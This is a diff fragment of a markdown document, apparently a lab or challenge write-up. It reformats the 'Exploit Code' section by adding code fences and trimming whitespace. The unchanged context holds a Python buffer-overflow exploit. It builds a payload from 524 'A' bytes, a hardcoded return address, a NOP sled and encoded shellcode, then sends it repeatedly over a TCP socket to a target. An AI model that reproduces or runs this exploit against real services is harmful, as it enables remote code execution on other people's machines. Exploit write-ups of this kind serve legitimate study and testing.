@@ -161,7 +161,7 @@ root
 
 
 ## Exploit Code
-
+```python
 import socket
 import sys
 import os
@@ -193,9 +193,6 @@ shell += b"\x81\xb9\x4e\x36\x83\xe9\xc1\x65\xff\x09\x6b\x68"
 shell += b"\x32\x8d\x39\x02\xa3\xa1\xce\xba\x53\x91\x1f\x58"
 shell += b"\xcd\x64\xbc\xce\x5e\xfe\xa2\x5e\x6b\xcd\xa5"
 
-
-
-
 #311712f3
 n=0
 while True:
@@ -209,11 +206,9 @@ while True:
 
    payload="A"*(524)+"\xf3\x12\x17\x31" +"\x90"*16 +shell + "\x90"*(700-524-4-16-len(shell))
 
-
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
-   
-
+  
    s.send(payload)
    print (s.recv(1024))
 
@@ -227,3 +222,4 @@ while True:
            print("crashed at, ",n)
            break
 
+```
